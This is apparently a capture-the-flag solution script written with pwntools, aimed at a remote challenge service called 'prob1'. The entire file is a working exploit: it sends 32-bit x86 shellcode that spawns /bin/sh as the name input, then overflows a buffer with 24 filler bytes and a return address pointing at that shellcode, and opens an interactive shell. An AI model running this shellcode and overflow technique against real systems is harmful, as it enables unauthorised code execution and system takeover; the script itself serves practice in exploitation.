from pwn import *
  
# p = process('./prob1')
p = remote('ctf.j0n9hyun.xyz', 3003)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
p.recvuntil("Name : ")
p.sendline(shellcode)

payload = b"A" * 24
payload += p32(0x0804A060)

p.recvuntil("input : ")
p.sendline(payload)

p.interactive()
